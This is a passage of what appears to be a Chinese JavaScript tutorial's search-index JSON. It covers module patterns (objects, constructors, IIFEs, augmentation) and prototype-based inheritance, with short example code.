Mixin\uff08\u6df7\u5165\uff09\u3002 \u6a21\u5757 \u00b6 \u968f\u7740\u7f51\u7ad9\u9010\u6e10\u53d8\u6210\u201c\u4e92\u8054\u7f51\u5e94\u7528\u7a0b\u5e8f\u201d\uff0c\u5d4c\u5165\u7f51\u9875\u7684 JavaScript \u4ee3\u7801\u8d8a\u6765\u8d8a\u5e9e\u5927\uff0c\u8d8a\u6765\u8d8a\u590d\u6742\u3002\u7f51\u9875\u8d8a\u6765\u8d8a\u50cf\u684c\u9762\u7a0b\u5e8f\uff0c\u9700\u8981\u4e00\u4e2a\u56e2\u961f\u5206\u5de5\u534f\u4f5c\u3001\u8fdb\u5ea6\u7ba1\u7406\u3001\u5355\u5143\u6d4b\u8bd5\u7b49\u7b49\u2026\u2026\u5f00\u53d1\u8005\u5fc5\u987b\u4f7f\u7528\u8f6f\u4ef6\u5de5\u7a0b\u7684\u65b9\u6cd5\uff0c\u7ba1\u7406\u7f51\u9875\u7684\u4e1a\u52a1\u903b\u8f91\u3002 JavaScript \u6a21\u5757\u5316\u7f16\u7a0b\uff0c\u5df2\u7ecf\u6210\u4e3a\u4e00\u4e2a\u8feb\u5207\u7684\u9700\u6c42\u3002\u7406\u60f3\u60c5\u51b5\u4e0b\uff0c\u5f00\u53d1\u8005\u53ea\u9700\u8981\u5b9e\u73b0\u6838\u5fc3\u7684\u4e1a\u52a1\u903b\u8f91\uff0c\u5176\u4ed6\u90fd\u53ef\u4ee5\u52a0\u8f7d\u522b\u4eba\u5df2\u7ecf\u5199\u597d\u7684\u6a21\u5757\u3002 \u4f46\u662f\uff0cJavaScript \u4e0d\u662f\u4e00\u79cd\u6a21\u5757\u5316\u7f16\u7a0b\u8bed\u8a00\uff0cES6 \u624d\u5f00\u59cb\u652f\u6301\u201c\u7c7b\u201d\u548c\u201c\u6a21\u5757\u201d\u3002\u4e0b\u9762\u4ecb\u7ecd\u4f20\u7edf\u7684\u505a\u6cd5\uff0c\u5982\u4f55\u5229\u7528\u5bf9\u8c61\u5b9e\u73b0\u6a21\u5757\u7684\u6548\u679c\u3002 \u57fa\u672c\u7684\u5b9e\u73b0\u65b9\u6cd5 \u00b6 \u6a21\u5757\u662f\u5b9e\u73b0\u7279\u5b9a\u529f\u80fd\u7684\u4e00\u7ec4\u5c5e\u6027\u548c\u65b9\u6cd5\u7684\u5c01\u88c5\u3002 \u7b80\u5355\u7684\u505a\u6cd5\u662f\u628a\u6a21\u5757\u5199\u6210\u4e00\u4e2a\u5bf9\u8c61\uff0c\u6240\u6709\u7684\u6a21\u5757\u6210\u5458\u90fd\u653e\u5230\u8fd9\u4e2a\u5bf9\u8c61\u91cc\u9762\u3002 1 2 3 4 5 6 7 8 9 var module1 = new Object ({ \u3000 _count : 0 , \u3000 m1 : function (){ \u3000\u3000 //... \u3000 }, \u3000 m2 : function (){ \u3000 //... \u3000 } }); \u4e0a\u9762\u7684\u51fd\u6570 m1 \u548c m2 \uff0c\u90fd\u5c01\u88c5\u5728 module1 \u5bf9\u8c61\u91cc\u3002\u4f7f\u7528\u7684\u65f6\u5019\uff0c\u5c31\u662f\u8c03\u7528\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5c5e\u6027\u3002 1 module1 . m1 (); \u4f46\u662f\uff0c\u8fd9\u6837\u7684\u5199\u6cd5\u4f1a\u66b4\u9732\u6240\u6709\u6a21\u5757\u6210\u5458\uff0c\u5185\u90e8\u72b6\u6001\u53ef\u4ee5\u88ab\u5916\u90e8\u6539\u5199\u3002\u6bd4\u5982\uff0c\u5916\u90e8\u4ee3\u7801\u53ef\u4ee5\u76f4\u63a5\u6539\u53d8\u5185\u90e8\u8ba1\u6570\u5668\u7684\u503c\u3002 1 module1 . _count = 5 ; \u5c01\u88c5\u79c1\u6709\u53d8\u91cf\uff1a\u6784\u9020\u51fd\u6570\u7684\u5199\u6cd5 \u00b6 \u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6784\u9020\u51fd\u6570\uff0c\u5c01\u88c5\u79c1\u6709\u53d8\u91cf\u3002 1 2 3 4 5 6 7 8 9 10 11 12 function StringBuilder () { var buffer = []; this . add = function ( str ) { buffer . push ( str ); }; this . toString = function () { return buffer . join ( '' ); }; } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c buffer \u662f\u6a21\u5757\u7684\u79c1\u6709\u53d8\u91cf\u3002\u4e00\u65e6\u751f\u6210\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u5916\u90e8\u662f\u65e0\u6cd5\u76f4\u63a5\u8bbf\u95ee buffer \u7684\u3002\u4f46\u662f\uff0c\u8fd9\u79cd\u65b9\u6cd5\u5c06\u79c1\u6709\u53d8\u91cf\u5c01\u88c5\u5728\u6784\u9020\u51fd\u6570\u4e2d\uff0c\u5bfc\u81f4\u6784\u9020\u51fd\u6570\u4e0e\u5b9e\u4f8b\u5bf9\u8c61\u662f\u4e00\u4f53\u7684\uff0c\u603b\u662f\u5b58\u5728\u4e8e\u5185\u5b58\u4e4b\u4e2d\uff0c\u65e0\u6cd5\u5728\u4f7f\u7528\u5b8c\u6210\u540e\u6e05\u9664\u3002\u8fd9\u610f\u5473\u7740\uff0c\u6784\u9020\u51fd\u6570\u6709\u53cc\u91cd\u4f5c\u7528\uff0c\u65e2\u7528\u6765\u5851\u9020\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u53c8\u7528\u6765\u4fdd\u5b58\u5b9e\u4f8b\u5bf9\u8c61\u7684\u6570\u636e\uff0c\u8fdd\u80cc\u4e86\u6784\u9020\u51fd\u6570\u4e0e\u5b9e\u4f8b\u5bf9\u8c61\u5728\u6570\u636e\u4e0a\u76f8\u5206\u79bb\u7684\u539f\u5219\uff08\u5373\u5b9e\u4f8b\u5bf9\u8c61\u7684\u6570\u636e\uff0c\u4e0d\u5e94\u8be5\u4fdd\u5b58\u5728\u5b9e\u4f8b\u5bf9\u8c61\u4ee5\u5916\uff09\u3002\u540c\u65f6\uff0c\u975e\u5e38\u8017\u8d39\u5185\u5b58\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 function StringBuilder () { this . _buffer = []; } StringBuilder . prototype = { constructor : StringBuilder , add : function ( str ) { this . _buffer . push ( str ); }, toString : function () { return this . _buffer . join ( '' ); } }; \u8fd9\u79cd\u65b9\u6cd5\u5c06\u79c1\u6709\u53d8\u91cf\u653e\u5165\u5b9e\u4f8b\u5bf9\u8c61\u4e2d\uff0c\u597d\u5904\u662f\u770b\u4e0a\u53bb\u66f4\u81ea\u7136\uff0c\u4f46\u662f\u5b83\u7684\u79c1\u6709\u53d8\u91cf\u53ef\u4ee5\u4ece\u5916\u90e8\u8bfb\u5199\uff0c\u4e0d\u662f\u5f88\u5b89\u5168\u3002 \u5c01\u88c5\u79c1\u6709\u53d8\u91cf\uff1a\u7acb\u5373\u6267\u884c\u51fd\u6570\u7684\u5199\u6cd5 \u00b6 \u53e6\u4e00\u79cd\u505a\u6cd5\u662f\u4f7f\u7528\u201c\u7acb\u5373\u6267\u884c\u51fd\u6570\u201d\uff08Immediately-Invoked Function Expression\uff0cIIFE\uff09\uff0c\u5c06\u76f8\u5173\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u5c01\u88c5\u5728\u4e00\u4e2a\u51fd\u6570\u4f5c\u7528\u57df\u91cc\u9762\uff0c\u53ef\u4ee5\u8fbe\u5230\u4e0d\u66b4\u9732\u79c1\u6709\u6210\u5458\u7684\u76ee\u7684\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var module1 = ( function () { \u3000 var _count = 0 ; \u3000 var m1 = function () { \u3000 //... \u3000 }; \u3000 var m2 = function () { \u3000\u3000 //... \u3000 }; \u3000 return { \u3000\u3000 m1 : m1 , \u3000\u3000 m2 : m2 \u3000 }; })(); \u4f7f\u7528\u4e0a\u9762\u7684\u5199\u6cd5\uff0c\u5916\u90e8\u4ee3\u7801\u65e0\u6cd5\u8bfb\u53d6\u5185\u90e8\u7684 _count \u53d8\u91cf\u3002 1 console . info ( module1 . _count ); //undefined \u4e0a\u9762\u7684 module1 \u5c31\u662f JavaScript \u6a21\u5757\u7684\u57fa\u672c\u5199\u6cd5\u3002\u4e0b\u9762\uff0c\u518d\u5bf9\u8fd9\u79cd\u5199\u6cd5\u8fdb\u884c\u52a0\u5de5\u3002 \u6a21\u5757\u7684\u653e\u5927\u6a21\u5f0f \u00b6 \u5982\u679c\u4e00\u4e2a\u6a21\u5757\u5f88\u5927\uff0c\u5fc5\u987b\u5206\u6210\u51e0\u4e2a\u90e8\u5206\uff0c\u6216\u8005\u4e00\u4e2a\u6a21\u5757\u9700\u8981\u7ee7\u627f\u53e6\u4e00\u4e2a\u6a21\u5757\uff0c\u8fd9\u65f6\u5c31\u6709\u5fc5\u8981\u91c7\u7528\u201c\u653e\u5927\u6a21\u5f0f\u201d\uff08augmentation\uff09\u3002 1 2 3 4 5 6 var module1 = ( function ( mod ){ \u3000 mod . m3 = function () { \u3000\u3000 //... \u3000 }; \u3000 return mod ; })( module1 ); \u4e0a\u9762\u7684\u4ee3\u7801\u4e3a module1 \u6a21\u5757\u6dfb\u52a0\u4e86\u4e00\u4e2a\u65b0\u65b9\u6cd5 m3() \uff0c\u7136\u540e\u8fd4\u56de\u65b0\u7684 module1 \u6a21\u5757\u3002 \u5728\u6d4f\u89c8\u5668\u73af\u5883\u4e2d\uff0c\u6a21\u5757\u7684\u5404\u4e2a\u90e8\u5206\u901a\u5e38\u90fd\u662f\u4ece\u7f51\u4e0a\u83b7\u53d6\u7684\uff0c\u6709\u65f6\u65e0\u6cd5\u77e5\u9053\u54ea\u4e2a\u90e8\u5206\u4f1a\u5148\u52a0\u8f7d\u3002\u5982\u679c\u91c7\u7528\u4e0a\u9762\u7684\u5199\u6cd5\uff0c\u7b2c\u4e00\u4e2a\u6267\u884c\u7684\u90e8\u5206\u6709\u53ef\u80fd\u52a0\u8f7d\u4e00\u4e2a\u4e0d\u5b58\u5728\u7a7a\u5bf9\u8c61\uff0c\u8fd9\u65f6\u5c31\u8981\u91c7\u7528\"\u5bbd\u653e\u5927\u6a21\u5f0f\"\uff08Loose augmentation\uff09\u3002 1 2 3 4 var module1 = ( function ( mod ) { \u3000 //... \u3000 return mod ; })( window . module1 || {}); \u4e0e\"\u653e\u5927\u6a21\u5f0f\"\u76f8\u6bd4\uff0c\u201c\u5bbd\u653e\u5927\u6a21\u5f0f\u201d\u5c31\u662f\u201c\u7acb\u5373\u6267\u884c\u51fd\u6570\u201d\u7684\u53c2\u6570\u53ef\u4ee5\u662f\u7a7a\u5bf9\u8c61\u3002 \u8f93\u5165\u5168\u5c40\u53d8\u91cf \u00b6 \u72ec\u7acb\u6027\u662f\u6a21\u5757\u7684\u91cd\u8981\u7279\u70b9\uff0c\u6a21\u5757\u5185\u90e8\u6700\u597d\u4e0d\u4e0e\u7a0b\u5e8f\u7684\u5176\u4ed6\u90e8\u5206\u76f4\u63a5\u4ea4\u4e92\u3002 \u4e3a\u4e86\u5728\u6a21\u5757\u5185\u90e8\u8c03\u7528\u5168\u5c40\u53d8\u91cf\uff0c\u5fc5\u987b\u663e\u5f0f\u5730\u5c06\u5176\u4ed6\u53d8\u91cf\u8f93\u5165\u6a21\u5757\u3002 1 2 3 var module1 = ( function ( $ , YAHOO ) { \u3000 //... })( jQuery , YAHOO ); \u4e0a\u9762\u7684 module1 \u6a21\u5757\u9700\u8981\u4f7f\u7528 jQuery \u5e93\u548c YUI \u5e93\uff0c\u5c31\u628a\u8fd9\u4e24\u4e2a\u5e93\uff08\u5176\u5b9e\u662f\u4e24\u4e2a\u6a21\u5757\uff09\u5f53\u4f5c\u53c2\u6570\u8f93\u5165 module1 \u3002\u8fd9\u6837\u505a\u9664\u4e86\u4fdd\u8bc1\u6a21\u5757\u7684\u72ec\u7acb\u6027\uff0c\u8fd8\u4f7f\u5f97\u6a21\u5757\u4e4b\u95f4\u7684\u4f9d\u8d56\u5173\u7cfb\u53d8\u5f97\u660e\u663e\u3002 \u7acb\u5373\u6267\u884c\u51fd\u6570\u8fd8\u53ef\u4ee5\u8d77\u5230\u547d\u540d\u7a7a\u95f4\u7684\u4f5c\u7528\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ( function ( $ , window , document ) { function go ( num ) { } function handleEvents () { } function initialize () { } function dieCarouselDie () { } //attach to the global scope window . finalCarousel = { init : initialize , destroy : dieCarouselDie } })( jQuery , window , document ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c finalCarousel \u5bf9\u8c61\u8f93\u51fa\u5230\u5168\u5c40\uff0c\u5bf9\u5916\u66b4\u9732 init \u548c destroy \u63a5\u53e3\uff0c\u5185\u90e8\u65b9\u6cd5 go \u3001 handleEvents \u3001 initialize \u3001 dieCarouselDie \u90fd\u662f\u5916\u90e8\u65e0\u6cd5\u8c03\u7528\u7684\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 JavaScript Modules: A Beginner\u2019s Guide , by Preethi Kasireddy","title":"\u5bf9\u8c61\u7684\u7ee7\u627f"},{"location":"oop/prototype/#_1","text":"\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u5f88\u91cd\u8981\u7684\u4e00\u4e2a\u65b9\u9762\uff0c\u5c31\u662f\u5bf9\u8c61\u7684\u7ee7\u627f\u3002A \u5bf9\u8c61\u901a\u8fc7\u7ee7\u627f B \u5bf9\u8c61\uff0c\u5c31\u80fd\u76f4\u63a5\u62e5\u6709 B \u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027\u548c\u65b9\u6cd5\u3002\u8fd9\u5bf9\u4e8e\u4ee3\u7801\u7684\u590d\u7528\u662f\u975e\u5e38\u6709\u7528\u7684\u3002 \u5927\u90e8\u5206\u9762\u5411\u5bf9\u8c61\u7684\u7f16\u7a0b\u8bed\u8a00\uff0c\u90fd\u662f\u901a\u8fc7\u201c\u7c7b\u201d\uff08class\uff09\u5b9e\u73b0\u5bf9\u8c61\u7684\u7ee7\u627f\u3002\u4f20\u7edf\u4e0a\uff0cJavaScript \u8bed\u8a00\u7684\u7ee7\u627f\u4e0d\u901a\u8fc7 class\uff0c\u800c\u662f\u901a\u8fc7\u201c\u539f\u578b\u5bf9\u8c61\u201d\uff08prototype\uff09\u5b9e\u73b0\uff0c\u672c\u7ae0\u4ecb\u7ecd JavaScript \u7684\u539f\u578b\u94fe\u7ee7\u627f\u3002 ES6 \u5f15\u5165\u4e86 class \u8bed\u6cd5\uff0c\u57fa\u4e8e class \u7684\u7ee7\u627f\u4e0d\u5728\u8fd9\u4e2a\u6559\u7a0b\u4ecb\u7ecd\uff0c\u8bf7\u53c2\u9605\u300aES6 \u6807\u51c6\u5165\u95e8\u300b\u4e00\u4e66\u7684\u76f8\u5173\u7ae0\u8282\u3002","title":"\u5bf9\u8c61\u7684\u7ee7\u627f"},{"location":"oop/prototype/#_2","text":"","title":"\u539f\u578b\u5bf9\u8c61\u6982\u8ff0"},{"location":"oop/prototype/#_3","text":"JavaScript \u901a\u8fc7\u6784\u9020\u51fd\u6570\u751f\u6210\u65b0\u5bf9\u8c61\uff0c\u56e0\u6b64\u6784\u9020\u51fd\u6570\u53ef\u4ee5\u89c6\u4e3a\u5bf9\u8c61\u7684\u6a21\u677f\u3002\u5b9e\u4f8b\u5bf9\u8c61\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5b9a\u4e49\u5728\u6784\u9020\u51fd\u6570\u5185\u90e8\u3002 1 2 3 4 5 6 7 8 9 function Cat ( name , color ) { this . name = name ; this . color = color ; } var cat1 = new Cat ( '\u5927\u6bdb' , '\u767d\u8272' ); cat1 . name // '\u5927\u6bdb' cat1 . color // '\u767d\u8272' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Cat \u51fd\u6570\u662f\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u51fd\u6570\u5185\u90e8\u5b9a\u4e49\u4e86 name \u5c5e\u6027\u548c color \u5c5e\u6027\uff0c\u6240\u6709\u5b9e\u4f8b\u5bf9\u8c61\uff08\u4e0a\u4f8b\u662f cat1 \uff09\u90fd\u4f1a\u751f\u6210\u8fd9\u4e24\u4e2a\u5c5e\u6027\uff0c\u5373\u8fd9\u4e24\u4e2a\u5c5e\u6027\u4f1a\u5b9a\u4e49\u5728\u5b9e\u4f8b\u5bf9\u8c61\u4e0a\u9762\u3002 \u901a\u8fc7\u6784\u9020\u51fd\u6570\u4e3a\u5b9e\u4f8b\u5bf9\u8c61\u5b9a\u4e49\u5c5e\u6027\uff0c\u867d\u7136\u5f88\u65b9\u4fbf\uff0c\u4f46\u662f\u6709\u4e00\u4e2a\u7f3a\u70b9\u3002\u540c\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u7684\u591a\u4e2a\u5b9e\u4f8b\u4e4b\u95f4\uff0c\u65e0\u6cd5\u5171\u4eab\u5c5e\u6027\uff0c\u4ece\u800c\u9020\u6210\u5bf9\u7cfb\u7edf\u8d44\u6e90\u7684\u6d6a\u8d39\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 function Cat ( name , color ) { this . name = name ; this . color = color ; this . meow = function () { console . log ( '\u55b5\u55b5' ); }; } var cat1 = new Cat ( '\u5927\u6bdb' , '\u767d\u8272' ); var cat2 = new Cat ( '\u4e8c\u6bdb' , '\u9ed1\u8272' ); cat1 . meow === cat2 . meow // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c cat1 \u548c cat2 \u662f\u540c\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u7684\u4e24\u4e2a\u5b9e\u4f8b\uff0c\u5b83\u4eec\u90fd\u5177\u6709 meow \u65b9\u6cd5\u3002\u7531\u4e8e meow \u65b9\u6cd5\u662f\u751f\u6210\u5728\u6bcf\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u4e0a\u9762\uff0c\u6240\u4ee5\u4e24\u4e2a\u5b9e\u4f8b\u5c31\u751f\u6210\u4e86\u4e24\u6b21\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6bcf\u65b0\u5efa\u4e00\u4e2a\u5b9e\u4f8b\uff0c\u5c31\u4f1a\u65b0\u5efa\u4e00\u4e2a meow \u65b9\u6cd5\u3002\u8fd9\u65e2\u6ca1\u6709\u5fc5\u8981\uff0c\u53c8\u6d6a\u8d39\u7cfb\u7edf\u8d44\u6e90\uff0c\u56e0\u4e3a\u6240\u6709 meow \u65b9\u6cd5\u90fd\u662f\u540c\u6837\u7684\u884c\u4e3a\uff0c\u5b8c\u5168\u5e94\u8be5\u5171\u4eab\u3002 \u8fd9\u4e2a\u95ee\u9898\u7684\u89e3\u51b3\u65b9\u6cd5\uff0c\u5c31\u662f JavaScript \u7684\u539f\u578b\u5bf9\u8c61\uff08prototype\uff09\u3002","title":"\u6784\u9020\u51fd\u6570\u7684\u7f3a\u70b9"},{"location":"oop/prototype/#prototype","text":"JavaScript \u7ee7\u627f\u673a\u5236\u7684\u8bbe\u8ba1\u601d\u60f3\u5c31\u662f\uff0c\u539f\u578b\u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u90fd\u80fd\u88ab\u5b9e\u4f8b\u5bf9\u8c61\u5171\u4eab\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u5c5e\u6027\u548c\u65b9\u6cd5\u5b9a\u4e49\u5728\u539f\u578b\u4e0a\uff0c\u90a3\u4e48\u6240\u6709\u5b9e\u4f8b\u5bf9\u8c61\u5c31\u80fd\u5171\u4eab\uff0c\u4e0d\u4ec5\u8282\u7701\u4e86\u5185\u5b58\uff0c\u8fd8\u4f53\u73b0\u4e86\u5b9e\u4f8b\u5bf9\u8c61\u4e4b\u95f4\u7684\u8054\u7cfb\u3002 \u4e0b\u9762\uff0c\u5148\u770b\u600e\u4e48\u4e3a\u5bf9\u8c61\u6307\u5b9a\u539f\u578b\u3002JavaScript \u89c4\u5b9a\uff0c\u6bcf\u4e2a\u51fd\u6570\u90fd\u6709\u4e00\u4e2a prototype \u5c5e\u6027\uff0c\u6307\u5411\u4e00\u4e2a\u5bf9\u8c61\u3002 1 2 function f () {} typeof f . prototype // \"object\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 f \u9ed8\u8ba4\u5177\u6709 prototype \u5c5e\u6027\uff0c\u6307\u5411\u4e00\u4e2a\u5bf9\u8c61\u3002 \u5bf9\u4e8e\u666e\u901a\u51fd\u6570\u6765\u8bf4\uff0c\u8be5\u5c5e\u6027\u57fa\u672c\u65e0\u7528\u3002\u4f46\u662f\uff0c\u5bf9\u4e8e\u6784\u9020\u51fd\u6570\u6765\u8bf4\uff0c\u751f\u6210\u5b9e\u4f8b\u7684\u65f6\u5019\uff0c\u8be5\u5c5e\u6027\u4f1a\u81ea\u52a8\u6210\u4e3a\u5b9e\u4f8b\u5bf9\u8c61\u7684\u539f\u578b\u3002 1 2 3 4 5 6 7 8 9 10 function Animal ( name ) { this . name = name ; } Animal . prototype . color = 'white' ; var cat1 = new Animal ( '\u5927\u6bdb' ); var cat2 = new Animal ( '\u4e8c\u6bdb' ); cat1 . color // 'white' cat2 . color // 'white' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6784\u9020\u51fd\u6570 Animal \u7684 prototype \u5c5e\u6027\uff0c\u5c31\u662f\u5b9e\u4f8b\u5bf9\u8c61 cat1 \u548c cat2 \u7684\u539f\u578b\u5bf9\u8c61\u3002\u539f\u578b\u5bf9\u8c61\u4e0a\u6dfb\u52a0\u4e00\u4e2a color \u5c5e\u6027\uff0c\u7ed3\u679c\uff0c\u5b9e\u4f8b\u5bf9\u8c61\u90fd\u5171\u4eab\u4e86\u8be5\u5c5e\u6027\u3002 \u539f\u578b\u5bf9\u8c61\u7684\u5c5e\u6027\u4e0d\u662f\u5b9e\u4f8b\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\u3002\u53ea\u8981\u4fee\u6539\u539f\u578b\u5bf9\u8c61\uff0c\u53d8\u52a8\u5c31\u7acb\u523b\u4f1a\u4f53\u73b0\u5728**\u6240\u6709**\u5b9e\u4f8b\u5bf9\u8c61\u4e0a\u3002 1 2 3 4 Animal . prototype . color = 'yellow' ; cat1 . color // \"yellow\" cat2 . color // \"yellow\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u539f\u578b\u5bf9\u8c61\u7684 color \u5c5e\u6027\u7684\u503c\u53d8\u4e3a yellow \uff0c\u4e24\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u7684 color \u5c5e\u6027\u7acb\u523b\u8ddf\u7740\u53d8\u4e86\u3002\u8fd9\u662f\u56e0\u4e3a\u5b9e\u4f8b\u5bf9\u8c61\u5176\u5b9e\u6ca1\u6709 color \u5c5e\u6027\uff0c\u90fd\u662f\u8bfb\u53d6\u539f\u578b\u5bf9\u8c61\u7684 color \u5c5e\u6027\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u5b9e\u4f8b\u5bf9\u8c61\u672c\u8eab\u6ca1\u6709\u67d0\u4e2a\u5c5e\u6027\u6216\u65b9\u6cd5\u7684\u65f6\u5019\uff0c\u5b83\u4f1a\u5230\u539f\u578b\u5bf9\u8c61\u53bb\u5bfb\u627e\u8be5\u5c5e\u6027\u6216\u65b9\u6cd5\u3002\u8fd9\u5c31\u662f\u539f\u578b\u5bf9\u8c61\u7684\u7279\u6b8a\u4e4b\u5904\u3002 \u5982\u679c\u5b9e\u4f8b\u5bf9\u8c61\u81ea\u8eab\u5c31\u6709\u67d0\u4e2a\u5c5e\u6027\u6216\u65b9\u6cd5\uff0c\u5b83\u5c31\u4e0d\u4f1a\u518d\u53bb\u539f\u578b\u5bf9\u8c61\u5bfb\u627e\u8fd9\u4e2a\u5c5e\u6027\u6216\u65b9\u6cd5\u3002 1 2 3 4 5 cat1 . color = 'black' ; cat1 . color // 'black' cat2 . color // 'yellow' Animal . prototype . color // 'yellow'; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b9e\u4f8b\u5bf9\u8c61 cat1 \u7684 color \u5c5e\u6027\u6539\u4e3a black \uff0c\u5c31\u4f7f\u5f97\u5b83\u4e0d\u518d\u53bb\u539f\u578b\u5bf9\u8c61\u8bfb\u53d6 color \u5c5e\u6027\uff0c\u540e\u8005\u7684\u503c\u4f9d\u7136\u4e3a yellow \u3002 \u603b\u7ed3\u4e00\u4e0b\uff0c\u539f\u578b\u5bf9\u8c61\u7684\u4f5c\u7528\uff0c\u5c31\u662f\u5b9a\u4e49\u6240\u6709\u5b9e\u4f8b\u5bf9\u8c61\u5171\u4eab\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002\u8fd9\u4e5f\u662f\u5b83\u88ab\u79f0\u4e3a\u539f\u578b\u5bf9\u8c61\u7684\u539f\u56e0\uff0c\u800c\u5b9e\u4f8b\u5bf9\u8c61\u53ef\u4ee5\u89c6\u4f5c\u4ece\u539f\u578b\u5bf9\u8c61\u884d\u751f\u51fa\u6765\u7684\u5b50\u5bf9\u8c61\u3002 1 2 3 Animal . prototype . walk = function () { console . log ( this . name + ' is walking' ); }; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Animal.prototype \u5bf9\u8c61\u4e0a\u9762\u5b9a\u4e49\u4e86\u4e00\u4e2a walk \u65b9\u6cd5\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u5c06\u53ef\u4ee5\u5728\u6240\u6709 Animal \u5b9e\u4f8b\u5bf9\u8c61\u4e0a\u9762\u8c03\u7528\u3002","title":"prototype \u5c5e\u6027\u7684\u4f5c\u7528"},{"location":"oop/prototype/#_4","text":"JavaScript \u89c4\u5b9a\uff0c\u6240\u6709\u5bf9\u8c61\u90fd\u6709\u81ea\u5df1\u7684\u539f\u578b\u5bf9\u8c61\uff08prototype\uff09\u3002\u4e00\u65b9\u9762\uff0c\u4efb\u4f55\u4e00\u4e2a\u5bf9\u8c61\uff0c\u90fd\u53ef\u4ee5\u5145\u5f53\u5176\u4ed6\u5bf9\u8c61\u7684\u539f\u578b\uff1b\u53e6\u4e00\u65b9\u9762\uff0c\u7531\u4e8e\u539f\u578b\u5bf9\u8c61\u4e5f\u662f\u5bf9\u8c61\uff0c\u6240\u4ee5\u5b83\u4e5f\u6709\u81ea\u5df1\u7684\u539f\u578b\u3002\u56e0\u6b64\uff0c\u5c31\u4f1a\u5f62\u6210\u4e00\u4e2a\u201c\u539f\u578b\u94fe\u201d\uff08prototype chain\uff09\uff1a\u5bf9\u8c61\u5230\u539f\u578b\uff0c\u518d\u5230\u539f\u578b\u7684\u539f\u578b\u2026\u2026 \u5982\u679c\u4e00\u5c42\u5c42\u5730\u4e0a\u6eaf\uff0c\u6240\u6709\u5bf9\u8c61\u7684\u539f\u578b\u6700\u7ec8\u90fd\u53ef\u4ee5\u4e0a\u6eaf\u5230 Object.prototype \uff0c\u5373 Object \u6784\u9020\u51fd\u6570\u7684 prototype \u5c5e\u6027\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6240\u6709\u5bf9\u8c61\u90fd\u7ee7\u627f\u4e86 Object.prototype \u7684\u5c5e\u6027\u3002\u8fd9\u5c31\u662f\u6240\u6709\u5bf9\u8c61\u90fd\u6709 valueOf \u548c toString \u65b9\u6cd5\u7684\u539f\u56e0\uff0c\u56e0\u4e3a\u8fd9\u662f\u4ece Object.prototype \u7ee7\u627f\u7684\u3002 \u90a3\u4e48\uff0c Object.prototype \u5bf9\u8c61\u6709\u6ca1\u6709\u5b83\u7684\u539f\u578b\u5462\uff1f\u56de\u7b54\u662f Object.prototype \u7684\u539f\u578b\u662f null \u3002 null \u6ca1\u6709\u4efb\u4f55\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u4e5f\u6ca1\u6709\u81ea\u5df1\u7684\u539f\u578b\u3002\u56e0\u6b64\uff0c\u539f\u578b\u94fe\u7684\u5c3d\u5934\u5c31\u662f null \u3002 1 2 Object . getPrototypeOf ( Object . prototype ) // null \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c Object.prototype \u5bf9\u8c61\u7684\u539f\u578b\u662f null \uff0c\u7531\u4e8e null \u6ca1\u6709\u4efb\u4f55\u5c5e\u6027\uff0c\u6240\u4ee5\u539f\u578b\u94fe\u5230\u6b64\u4e3a\u6b62\u3002 Object.getPrototypeOf \u65b9\u6cd5\u8fd4\u56de\u53c2\u6570\u5bf9\u8c61\u7684\u539f\u578b\uff0c\u5177\u4f53\u4ecb\u7ecd\u8bf7\u770b\u540e\u6587\u3002 \u8bfb\u53d6\u5bf9\u8c61\u7684\u67d0\u4e2a\u5c5e\u6027\u65f6\uff0cJavaScript \u5f15\u64ce\u5148\u5bfb\u627e\u5bf9\u8c61\u672c\u8eab\u7684\u5c5e\u6027\uff0c\u5982\u679c\u627e\u4e0d\u5230\uff0c\u5c31\u5230\u5b83\u7684\u539f\u578b\u53bb\u627e\uff0c\u5982\u679c\u8fd8\u662f\u627e\u4e0d\u5230\uff0c\u5c31\u5230\u539f\u578b\u7684\u539f\u578b\u53bb\u627e\u3002\u5982\u679c\u76f4\u5230\u6700\u9876\u5c42\u7684 Object.prototype \u8fd8\u662f\u627e\u4e0d\u5230\uff0c\u5219\u8fd4\u56de undefined 